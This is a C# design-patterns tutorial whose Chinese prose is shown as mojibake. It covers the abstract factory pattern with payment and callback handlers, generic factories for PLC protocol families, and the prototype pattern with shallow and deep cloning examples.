<h2 data-id="heading-55">æŠ½è±¡å·¥å‚è®¾è®¡æ¨¡å¼(Abstract Factory Pattern)</h2>
<h4 data-id="heading-56">æŠ½è±¡å·¥å‚æ˜¯ä»€ä¹ˆï¼Ÿ</h4>
<ul>
<li><strong>æ ¸å¿ƒ</strong>ï¼šä¸æ˜¯åˆ›å»ºå•ä¸€äº§å“ï¼Œè€Œæ˜¯åˆ›å»º<strong>ä¸€ç»„ç›¸å…³äº§å“</strong>ï¼ˆæ¯”å¦‚æ”¯ä»˜æ–¹å¼+é…å¥—çš„å›è°ƒå¤„ç†å™¨ï¼‰ã€‚æŠ½è±¡å·¥å‚å®šä¹‰æ¥å£ï¼Œè®©å…·ä½“å·¥å‚å®ç°ä¸€æ•´æ—ã€‚</li>
<li><strong>æ¯”å–»</strong>ï¼šå·¥å‚æ–¹æ³•åƒâ€œæ¯ä¸ªè½¦å‹æœ‰ç”Ÿäº§çº¿â€ï¼ˆè½¿è½¦ç”Ÿäº§çº¿åªé€ è½¿è½¦ï¼‰ã€‚æŠ½è±¡å·¥å‚åƒâ€œæ•´ä¸ªå“ç‰Œå·¥å‚â€ï¼ˆå®é©¬å·¥å‚é€ è½¿è½¦+å‘åŠ¨æœº+è½®èƒï¼Œä¸€æ—é…å¥—ï¼‰ã€‚</li>
<li><strong>ä¸ºä»€ä¹ˆå«â€œæŠ½è±¡â€</strong> ï¼šå·¥å‚æœ¬èº«æ˜¯æŠ½è±¡çš„ï¼ˆæ¥å£ï¼‰ï¼Œå…·ä½“å·¥å‚å®ç°å®ƒã€‚</li>
</ul>
<h4 data-id="heading-57">ä»£ç ç¤ºä¾‹ï¼šæ‰©å±•æ”¯ä»˜ç³»ç»Ÿï¼ˆæ”¯ä»˜ + å›è°ƒå¤„ç†å™¨ï¼‰</h4>
<p>å‡è®¾æ”¯ä»˜ç³»ç»Ÿä¸ä»…æ‰£æ¬¾ï¼Œè¿˜è¦å¤„ç†å›è°ƒï¼ˆæ¯”å¦‚æ”¯ä»˜å®å›è°ƒé€šçŸ¥æ”¯ä»˜æˆåŠŸï¼‰ã€‚ä¸€ç»„äº§å“ï¼šæ”¯ä»˜å™¨ï¼ˆPaymentï¼‰ + å›è°ƒå¤„ç†å™¨ï¼ˆCallbackHandlerï¼‰ã€‚è¦ä¿è¯å®ƒä»¬é…å¥—ï¼ˆæ”¯ä»˜å®æ”¯ä»˜é…æ”¯ä»˜å®å›è°ƒï¼‰ã€‚</p>
<h5 data-id="heading-58">æŠ½è±¡å·¥å‚ç‰ˆæœ¬</h5>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 1. äº§å“æ¥å£ï¼ˆæ”¯ä»˜å™¨å’Œå›è°ƒå¤„ç†å™¨ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IPayment</span> {
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Pay</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span>;
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">ICallbackHandler</span> {
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HandleCallback</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> data</span>)</span>;  <span class="hljs-comment">// å¤„ç†å›è°ƒ</span>
}

<span class="hljs-comment">// 2. æŠ½è±¡å·¥å‚æ¥å£ï¼ˆå®šä¹‰ä¸€æ—äº§å“ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IPaymentFactory</span> {
    <span class="hljs-function">IPayment <span class="hljs-title">CreatePayment</span>()</span>;          <span class="hljs-comment">// åˆ›å»ºæ”¯ä»˜å™¨</span>
    <span class="hljs-function">ICallbackHandler <span class="hljs-title">CreateCallbackHandler</span>()</span>;  <span class="hljs-comment">// åˆ›å»ºå›è°ƒå¤„ç†å™¨</span>
}

<span class="hljs-comment">// 3. å…·ä½“å·¥å‚ï¼šæ”¯ä»˜å®æ—ï¼ˆæ”¯ä»˜ + æ”¯ä»˜å®å›è°ƒï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AlipayFactory</span> : <span class="hljs-title">IPaymentFactory</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> IPayment <span class="hljs-title">CreatePayment</span>()</span> =&gt; <span class="hljs-keyword">new</span> AlipayPayment();
    <span class="hljs-function"><span class="hljs-keyword">public</span> ICallbackHandler <span class="hljs-title">CreateCallbackHandler</span>()</span> =&gt; <span class="hljs-keyword">new</span> AlipayCallbackHandler();
}

<span class="hljs-comment">// æ”¯ä»˜å®æ”¯ä»˜å®ç°</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AlipayPayment</span> : <span class="hljs-title">IPayment</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Pay</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span> =&gt; Console.WriteLine(<span class="hljs-string">$"Paid <span class="hljs-subst">{amount}</span> via Alipay."</span>);
}

<span class="hljs-comment">// æ”¯ä»˜å®å›è°ƒå®ç°</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AlipayCallbackHandler</span> : <span class="hljs-title">ICallbackHandler</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">HandleCallback</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> data</span>)</span> =&gt; Console.WriteLine(<span class="hljs-string">$"Alipay callback: <span class="hljs-subst">{data}</span>"</span>);
}

<span class="hljs-comment">// 4. å¾®ä¿¡ç»„ï¼ˆæ”¯ä»˜ + å¾®ä¿¡å›è°ƒï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">WechatFactory</span> : <span class="hljs-title">IPaymentFactory</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> IPayment <span class="hljs-title">CreatePayment</span>()</span> =&gt; <span class="hljs-keyword">new</span> WechatPayment();
    <span class="hljs-function"><span class="hljs-keyword">public</span> ICallbackHandler <span class="hljs-title">CreateCallbackHandler</span>()</span> =&gt; <span class="hljs-keyword">new</span> WechatCallbackHandler();
}

<span class="hljs-comment">// å¾®ä¿¡æ”¯ä»˜</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">WechatPayment</span> : <span class="hljs-title">IPayment</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Pay</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span> =&gt; Console.WriteLine(<span class="hljs-string">$"Paid <span class="hljs-subst">{amount}</span> via Wechat."</span>);
}

<span class="hljs-comment">// å¾®ä¿¡å›è°ƒ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">WechatCallbackHandler</span> : <span class="hljs-title">ICallbackHandler</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">HandleCallback</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> data</span>)</span> =&gt; Console.WriteLine(<span class="hljs-string">$"Wechat callback: <span class="hljs-subst">{data}</span>"</span>);
}

<span class="hljs-comment">// 5. ä½¿ç”¨ï¼ˆé¡¾å®¢ä¸‹å• + å¤„ç†å›è°ƒï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">OrderService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IPaymentFactory _factory;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">OrderService</span>(<span class="hljs-params">IPaymentFactory factory</span>)</span> {  <span class="hljs-comment">// DIæ³¨å…¥</span>
        _factory = factory;
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ProcessPayment</span>(<span class="hljs-params"><span class="hljs-built_in">decimal</span> amount</span>)</span> {
        <span class="hljs-keyword">var</span> payment = _factory.CreatePayment();
        payment.Pay(amount);
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ProcessCallback</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> data</span>)</span> {
        <span class="hljs-keyword">var</span> handler = _factory.CreateCallbackHandler();
        handler.HandleCallback(data);
    }
}

<span class="hljs-comment">// 6. DIæ³¨å†Œ</span>
services.AddSingleton&lt;IPaymentFactory, AlipayFactory&gt;();  <span class="hljs-comment">// é»˜è®¤æ”¯ä»˜å®æ—</span>

<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-keyword">var</span> factory = <span class="hljs-keyword">new</span> AlipayFactory();  <span class="hljs-comment">// å®é™…DIæ³¨å…¥</span>
<span class="hljs-keyword">var</span> service = <span class="hljs-keyword">new</span> OrderService(factory);
service.ProcessPayment(<span class="hljs-number">100</span>);       <span class="hljs-comment">// Paid 100 via Alipay.</span>
service.ProcessCallback(<span class="hljs-string">"success"</span>); <span class="hljs-comment">// Alipay callback: success</span>

<span class="hljs-comment">// æ‰©å±•PayPalæ—ï¼šåŠ PaypalFactoryã€PaypalPaymentã€PaypalCallbackHandler</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">PaypalFactory</span> : <span class="hljs-title">IPaymentFactory</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> IPayment <span class="hljs-title">CreatePayment</span>()</span> =&gt; <span class="hljs-keyword">new</span> PaypalPayment();
    <span class="hljs-function"><span class="hljs-keyword">public</span> ICallbackHandler <span class="hljs-title">CreateCallbackHandler</span>()</span> =&gt; <span class="hljs-keyword">new</span> PaypalCallbackHandler();
}
<span class="hljs-comment">// DIæ¢æ³¨å†Œï¼šservices.AddSingleton&lt;IPaymentFactory, PaypalFactory&gt;();</span>
<span class="hljs-comment">// OrderServiceä»£ç ä¸å˜ï¼</span>
</code></pre>
<h4 data-id="heading-59">æ¯”å·¥å‚æ–¹æ³•å¥½åœ¨å“ªé‡Œï¼Ÿ</h4>
<p>å·¥å‚æ–¹æ³•åªåˆ›å»ºå•ä¸€äº§å“ï¼ˆæ¯”å¦‚åªPaymentï¼‰ï¼ŒæŠ½è±¡å·¥å‚åˆ›å»º<strong>ä¸€ç»„äº§å“</strong>ï¼ˆPayment + CallbackHandlerï¼‰ï¼Œä¿è¯é…å¥—ä¸€è‡´ã€‚</p>
<h5 data-id="heading-60">1. <strong>äº§å“æ—ä¸€è‡´æ€§</strong>ï¼ˆæ ¸å¿ƒä¼˜åŠ¿ï¼‰</h5>
<ul>
<li><strong>å·¥å‚æ–¹æ³•</strong>ï¼š<code>IPaymentFactory.Create()</code> åªè¿”å›Paymentã€‚å›è°ƒå¤„ç†å™¨å¾—å•ç‹¬å¤„ç†ï¼Œå¯èƒ½æ··ç”¨ï¼ˆæ”¯ä»˜å®æ”¯ä»˜é…å¾®ä¿¡å›è°ƒï¼Œé”™ä¹±ï¼‰ã€‚</li>
<li><strong>æŠ½è±¡å·¥å‚</strong>ï¼šä¸€æ—äº§å“ä¸€èµ·åˆ›å»ºï¼Œç¡®ä¿é…å¥—ï¼ˆæ”¯ä»˜å®å·¥å‚å‡ºæ”¯ä»˜å®æ”¯ä»˜+æ”¯ä»˜å®å›è°ƒï¼‰ã€‚åˆ‡æ¢æ—æ—¶ï¼Œæ‰€æœ‰äº§å“ä¸€èµ·æ¢ï¼Œé€»è¾‘ä¸€è‡´ã€‚</li>
<li><strong>å¥½å¤„</strong>ï¼šé¿å…é”™è¯¯ç»„åˆï¼ŒåƒUIæ¡†æ¶ï¼ˆæŒ‰é’®+ä¸»é¢˜é…å¥—ï¼‰ï¼Œæˆ–æ•°æ®åº“ï¼ˆè¿æ¥+å‘½ä»¤é…å¥—ï¼‰ã€‚</li>
</ul>
<h5 data-id="heading-61">2. <strong>æ‰©å±•æ›´å¼º</strong>ï¼ˆåŠ æ–°æ—ï¼Œä¸æ”¹è€ä»£ç ï¼‰</h5>
<ul>
<li>åŠ PayPalæ—ï¼Œåªå†™æ–°Factory + æ–°äº§å“æ—ï¼Œä¸æ”¹AlipayFactoryæˆ–WechatFactoryã€‚</li>
<li>å·¥å‚æ–¹æ³•åŠ æ–°äº§å“ä¹Ÿè¡Œï¼Œä½†æ²¡â€œç»„â€æ¦‚å¿µã€‚</li>
</ul>
<h5 data-id="heading-62">3. <strong>å¤æ‚åœºæ™¯é€‚ç”¨</strong>ï¼ˆäº§å“ç›¸å…³æ—¶ï¼‰</h5>
<ul>
<li>é€‚ç”¨ï¼šäº§å“æœ‰ä¾èµ–å…³ç³»ï¼ˆå¦‚æ”¯ä»˜+å›è°ƒå¿…é¡»åŒ¹é…ï¼‰ã€‚</li>
<li>ä¸é€‚ç”¨ï¼šäº§å“ç‹¬ç«‹æ—¶ï¼Œç”¨å·¥å‚æ–¹æ³•å¤Ÿäº†ã€‚</li>
</ul>
<h4 data-id="heading-63">å¯¹æ¯”å·¥å‚æ–¹æ³•</h4>



































<table><thead><tr><th>æ–¹é¢</th><th>å·¥å‚æ–¹æ³•</th><th>æŠ½è±¡å·¥å‚</th></tr></thead><tbody><tr><td><strong>åˆ›å»º</strong></td><td>å•ä¸€äº§å“</td><td>ä¸€ç»„äº§å“</td></tr><tr><td><strong>ä¸€è‡´æ€§</strong></td><td>æ— </td><td>ä¿è¯ç»„é…å¥—</td></tr><tr><td><strong>ç±»æ•°</strong></td><td>æ¯ä¸ªäº§å“1å·¥å‚</td><td>æ¯ç»„1å·¥å‚</td></tr><tr><td><strong>é€‚ç”¨</strong></td><td>äº§å“ç‹¬ç«‹</td><td>äº§å“ç›¸å…³ï¼Œéœ€é…å¥—</td></tr><tr><td><strong>ä¾‹å­</strong></td><td>æ—¥å¿—å·¥å‚ï¼ˆåªæ—¥å¿—ï¼‰</td><td>UIå·¥å‚ï¼ˆæŒ‰é’®+ä¸»é¢˜ï¼‰</td></tr></tbody></table>
<p>æŠ½è±¡å·¥å‚æ˜¯å·¥å‚æ–¹æ³•çš„è¶…é›†ï¼Œåœ¨äº§å“æ—åœºæ™¯æ›´å¥½ã€‚ä½†å¦‚æœäº§å“ä¸ç›¸å…³ï¼Œåˆ«ç”¨ï¼Œä¼šå¤šä½™ã€‚</p>
<h2 data-id="heading-64">æ³›å‹æŠ½è±¡å·¥å‚ï¼ˆæ€ä¹ˆå†™ä¸ä½•æ—¶ç”¨ï¼‰</h2>
<p>è¿™éƒ¨åˆ†ç»å¸¸ä¼šè®©äººâ€œå†™ç€å†™ç€å°±æ³›å‹åœ°ç‹±â€ã€‚ç»“è®ºå…ˆè¯´ï¼š</p>
<ul>
<li>æŠ½è±¡å·¥å‚çš„æœ¬è´¨æ˜¯â€œåˆ›å»ºä¸€æ—ç›¸å…³å¯¹è±¡â€ï¼›</li>
<li>æ˜¯å¦ç”¨æ³›å‹è¦çœ‹ä½ æ˜¯å¦çœŸçš„éœ€è¦â€œç¼–è¯‘æœŸçº¦æŸ + ç±»å‹å®‰å…¨â€ã€‚</li>
<li>åœ¨ .NET é¡¹ç›®é‡Œï¼Œå¾ˆå¤šâ€œæ³›å‹æŠ½è±¡å·¥å‚â€çš„éœ€æ±‚æœ€ç»ˆä¼šè¢« DI å®¹å™¨æ›´ä¼˜é›…åœ°è§£å†³ï¼ˆæ³¨å†Œä¸åŒå®ç°ï¼Œç„¶åæŒ‰é…ç½®é€‰æ‹©ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-65">1) éæ³›å‹ç‰ˆæœ¬ï¼ˆæ›´ç›´è§‚ï¼‰</h3>
<p>ä¾‹å¦‚ PLC åè®®æ—ï¼šé©±åŠ¨ + åœ°å€è§£æå™¨ + æ•°æ®ç¼–è§£ç å™¨ï¼ˆåŒä¸€æ—è¦é…å¥—ï¼‰ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IPlcFamilyFactory</span>
{
    <span class="hljs-function">IPlcDriver <span class="hljs-title">CreateDriver</span>()</span>;
    <span class="hljs-function">IAddressTranslator <span class="hljs-title">CreateAddressTranslator</span>()</span>;
    <span class="hljs-function">IDataCodec <span class="hljs-title">CreateCodec</span>()</span>;
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IAddressTranslator</span> { <span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">Normalize</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> address</span>)</span>; }
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IDataCodec</span> { <span class="hljs-function"><span class="hljs-built_in">byte</span>[] <span class="hljs-title">Encode</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params">T <span class="hljs-keyword">value</span></span>)</span>; <span class="hljs-function">T <span class="hljs-title">Decode</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params"><span class="hljs-built_in">byte</span>[] raw</span>)</span>; }
</code></pre>
<h3 data-id="heading-66">2) æ³›å‹ç‰ˆæœ¬ï¼ˆç±»å‹æ›´å¼ºï¼Œä½†æ›´â€œé‡â€ï¼‰</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IAbstractFactory</span>&lt;<span class="hljs-keyword">out</span> <span class="hljs-title">T1</span>, <span class="hljs-keyword">out</span> <span class="hljs-title">T2</span>&gt;
{
    <span class="hljs-function">T1 <span class="hljs-title">CreateFirst</span>()</span>;
    <span class="hljs-function">T2 <span class="hljs-title">CreateSecond</span>()</span>;
}

<span class="hljs-comment">// ç¤ºä¾‹ï¼šåˆ›å»ºâ€œé©±åŠ¨ + ç¼–è§£ç å™¨â€è¿™ä¸€æ—</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IPlcFamilyFactory</span>&lt;<span class="hljs-title">TDriver</span>, <span class="hljs-title">TCodec</span>&gt; : <span class="hljs-title">IAbstractFactory</span>&lt;<span class="hljs-title">TDriver</span>, <span class="hljs-title">TCodec</span>&gt;
    <span class="hljs-keyword">where</span> <span class="hljs-title">TDriver</span> : <span class="hljs-title">IPlcDriver</span>
    <span class="hljs-keyword">where</span> <span class="hljs-title">TCodec</span> : <span class="hljs-title">IDataCodec</span>
{
}
</code></pre>
<p>ä»€ä¹ˆæ—¶å€™å€¼å¾—ç”¨æ³›å‹ï¼š</p>
<ul>
<li>ä½ åœ¨å†™â€œé€šç”¨åº“â€ï¼Œå¸Œæœ›è°ƒç”¨æ–¹åœ¨ç¼–è¯‘æœŸå°±æ‹¿åˆ°å¼ºç±»å‹ï¼ˆå‡å°‘è¿è¡Œæ—¶é”™è¯¯ï¼‰ã€‚</li>
</ul>
<p>ä»€ä¹ˆæ—¶å€™ä¸å€¼å¾—ï¼š</p>
<ul>
<li>ä¸šåŠ¡é¡¹ç›®é‡Œä¸»è¦é é…ç½®å†³å®šåè®®/å‹å·ï¼›è¿™ç±»æ›´é€‚åˆâ€œéæ³›å‹æŠ½è±¡ + DI + é…ç½®é€‰æ‹©â€ã€‚</li>
</ul>
<h2 data-id="heading-67">åŸå‹è®¾è®¡æ¨¡å¼</h2>
<h3 data-id="heading-68">è¦ç‚¹é€Ÿè§ˆ</h3>
<ul>
<li>
<p>ç›®çš„ï¼šåœ¨è¿è¡Œæ—¶å¤åˆ¶å·²æœ‰å¯¹è±¡ï¼Œè€Œä¸æ˜¯é€šè¿‡ new + æ„é€ å™¨é‡æ–°åˆå§‹åŒ–ï¼ˆå°¤å…¶é€‚åˆåˆ›å»ºæˆæœ¬é«˜æˆ–åˆå§‹åŒ–å¤æ‚çš„å¯¹è±¡ï¼Œæˆ–éœ€è¦ä¿ç•™è¿è¡Œæ—¶çŠ¶æ€çš„å¯¹è±¡ï¼‰ã€‚</p>
</li>
<li>
<p>ä¸¤ç§æ‹·è´ï¼š</p>
<ul>
<li>æµ…æ‹·è´ï¼ˆshallow copyï¼‰ï¼šå¤åˆ¶å¯¹è±¡è‡ªèº«çš„å­—æ®µï¼Œä½†å¼•ç”¨ç±»å‹å­—æ®µä»æŒ‡å‘åŒä¸€å®ä¾‹ï¼ˆå¸¸ç”¨ MemberwiseCloneï¼‰ã€‚</li>
<li>æ·±æ‹·è´ï¼ˆdeep copyï¼‰ï¼šå¤åˆ¶æ•´ä¸ªå¯¹è±¡å›¾ï¼Œå¼•ç”¨ç±»å‹å­—æ®µä¹Ÿè¢«å¤åˆ¶ä¸ºæ–°å®ä¾‹ï¼ˆéœ€è¦æ˜¾å¼å¤åˆ¶æˆ–å€ŸåŠ©åº“/åºåˆ—åŒ–ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p>C# ä¸­çš„é™·é˜±ï¼šICloneable æ¥å£è¯­ä¹‰ä¸æ˜ç¡®ï¼ˆæ²¡æœ‰æ ‡æ³¨æ·±/æµ…ï¼‰ï¼Œä¸å»ºè®®ç›´æ¥ä¾èµ–æ ‡å‡† ICloneableã€‚åœ¨åº“å±‚é¢å¸¸ç”¨è‡ªå®šä¹‰æ³›å‹æ¥å£æˆ– Copy/Clone æ–¹æ³•æ˜ç¡®è¯­ä¹‰ã€‚</p>
</li>
<li>
<p>ç¬¬ä¸‰æ–¹åº“ï¼ˆå¦‚ä½ æåˆ°çš„ CloneExtensionsï¼‰å¯ä»¥å¿«æ·å®ç°ï¼Œä½†éœ€æ³¨æ„æ€§èƒ½ã€å¾ªç¯å¼•ç”¨æ”¯æŒã€å¯¹äº‹ä»¶/å§”æ‰˜çš„å¤„ç†ç­‰ã€‚</p>
</li>
</ul>
<h3 data-id="heading-69">è®¾è®¡å»ºè®®ï¼ˆå®è·µï¼‰</h3>
<ul>
<li>æ˜ç¡®è¯­ä¹‰ï¼šè‡ªå·±å®šä¹‰ IPrototype æˆ– ICloneable å¹¶æŠŠæ·±/æµ…å†™è¿›æ–‡æ¡£/æ–¹æ³•åï¼ˆCloneShallow/CloneDeepï¼‰ã€‚</li>
<li>ä¼˜å…ˆè€ƒè™‘ä¸å¯å˜å¯¹è±¡ï¼ˆimmutableï¼‰ä»¥é¿å…éœ€è¦å…‹éš†ã€‚</li>
<li>å¦‚æœå¯¹è±¡å›¾å¤æ‚ï¼Œè‡ªå·±æ§åˆ¶å…‹éš†é€»è¾‘ï¼ˆæ¯ä¸ªæœ‰å¼•ç”¨ç±»å‹å­—æ®µçš„ç±»éƒ½å®ç° cloneï¼‰å¸¸æœ€å¯é ã€‚</li>
<li>åºåˆ—åŒ–å®ç°ï¼ˆJSON / protobuf / MessagePackï¼‰èƒ½å¿«é€Ÿå®ç°æ·±æ‹·è´ï¼Œä½†å—é™äºå¯åºåˆ—åŒ–æ€§ã€æ€§èƒ½å’Œå¯¹å¾ªç¯å¼•ç”¨çš„æ”¯æŒã€‚</li>
<li>ç¬¬ä¸‰æ–¹åº“ï¼šä½¿ç”¨å‰æ£€æŸ¥åº“æ˜¯å¦æ”¯æŒå¾ªç¯å¼•ç”¨ã€æ˜¯å¦ä¿ç•™å¯¹è±¡èº«ä»½ã€æ€§èƒ½åŸºå‡†ã€æ˜¯å¦ä¼šå¤åˆ¶äº‹ä»¶è®¢é˜…ç­‰ã€‚</li>
</ul>
<h3 data-id="heading-70">ç¤ºä¾‹ä»£ç ï¼ˆC#ï¼‰</h3>
<ol start="0">
<li>åŸºæœ¬çš„åŸå‹æ¥å£ï¼ˆæ¨èè‡ªå®šä¹‰æ¥å£ï¼Œæ˜ç¡®è¿”å›ç±»å‹ï¼‰</li>
</ol>
<p>C#</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IPrototype</span>&lt;<span class="hljs-title">T</span>&gt;
{
    <span class="hljs-function">T <span class="hljs-title">Clone</span>()</span>; <span class="hljs-comment">// è¯­ä¹‰ç”±å®ç°æ–¹å†³å®šï¼ˆå»ºè®®æ³¨é‡Šè¯´æ˜æ˜¯æµ…/æ·±ï¼‰</span>
}
</code></pre>
<ol start="0">
<li>æµ…æ‹·è´ â€” ä½¿ç”¨ MemberwiseCloneï¼ˆå—ä¿æŠ¤ï¼Œåªèƒ½åœ¨ç±»å†…éƒ¨è°ƒç”¨ï¼‰</li>
</ol>
<p>C#</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Address</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> City { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> : <span class="hljs-title">IPrototype</span>&lt;<span class="hljs-title">Person</span>&gt;
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Name { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    <span class="hljs-keyword">public</span> Address Address { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }

    <span class="hljs-comment">// æµ…æ‹·è´ï¼šAddress å¼•ç”¨è¢«å…±äº«</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> Person <span class="hljs-title">Clone</span>()</span>
    {
        <span class="hljs-keyword">return</span> (Person)<span class="hljs-keyword">this</span>.MemberwiseClone();
    }
}
</code></pre>
<ol start="0">
<li>æ·±æ‹·è´ â€” æ‰‹åŠ¨å®ç°ï¼ˆæœ€å¯æ§ã€æœ€å®‰å…¨ï¼‰</li>
</ol>
<p>C#</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Address</span> : <span class="hljs-title">IPrototype</span>&lt;<span class="hljs-title">Address</span>&gt;
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> City { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    <span class="hljs-function"><span class="hljs-keyword">public</span> Address <span class="hljs-title">Clone</span>()</span> =&gt; <span class="hljs-keyword">new</span> Address { City = <span class="hljs-keyword">this</span>.City };
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> : <span class="hljs-title">IPrototype</span>&lt;<span class="hljs-title">Person</span>&gt;
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Name { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
    <span class="hljs-keyword">public</span> Address Address { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }

    <span class="hljs-comment">// æ·±æ‹·è´ï¼šåŒæ—¶å…‹éš† Address</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> Person <span class="hljs-title">Clone</span>()</span>
    {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Person
        {
            Name = <span class="hljs-keyword">this</span>.Name,
            Address = <span class="hljs-keyword">this</span>.Address?.Clone()
        };
    }
}
</code></pre>
<ol start="0">
<li>æ·±æ‹·è´ â€” ä½¿ç”¨ JSON åºåˆ—åŒ–ï¼ˆå¿«æ·ï¼Œä½†æœ‰é™åˆ¶ï¼‰</li>
</ol>
<ul>
<li>ä¼˜ç‚¹ï¼šéå¸¸æ–¹ä¾¿ï¼Œé€‚åˆç”¨äºæ²¡æœ‰å¾ªç¯å¼•ç”¨ä¸”ç±»å‹å¯åºåˆ—åŒ–çš„åœºæ™¯ã€‚</li>
<li>ç¼ºç‚¹ï¼šæ€§èƒ½è¾ƒå·®ã€ä¸èƒ½å…‹éš†ä¸å¯åºåˆ—åŒ–æˆå‘˜ã€å¯èƒ½æ”¹å˜å¯¹è±¡ï¼ˆä¾‹å¦‚ private å­—æ®µä¸å¯åºåˆ—åŒ–ï¼‰ã€‚ ç¤ºä¾‹ï¼ˆSystem.Text.Jsonï¼‰ï¼š</li>
</ul>
<p>C#</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">using</span> System.Text.Json;
<span class="hljs-keyword">using</span> System.Text.Json.Serialization;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title">CloneHelpers</span>
{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> T <span class="hljs-title">DeepCloneJson</span>&lt;<span class="hljs-title">T</span>&gt;(<span class="hljs-params">T source</span>)</span>
    {
        <span class="hljs-keyword">var</span> options = <span class="hljs-keyword">new</span> JsonSerializerOptions
        {
            <span class="hljs-comment">// å¦‚æœéœ€è¦ä¿ç•™å¯¹è±¡å¼•ç”¨/å¾ªç¯å¼•ç”¨ï¼Œè¯·ä½¿ç”¨ ReferenceHandler.Preserveï¼ˆå¹¶æ³¨æ„ååºåˆ—åŒ–æ—¶è¡¨ç°ï¼‰</span>
            <span class="hljs-comment">// ReferenceHandler = ReferenceHandler.Preserve</span>
        };
        <span class="hljs-keyword">var</span> json = JsonSerializer.Serialize(source, options);
        <span class="hljs-keyword">return</span> JsonSerializer.Deserialize&lt;T&gt;(json, options);
    }
}
</code></pre>
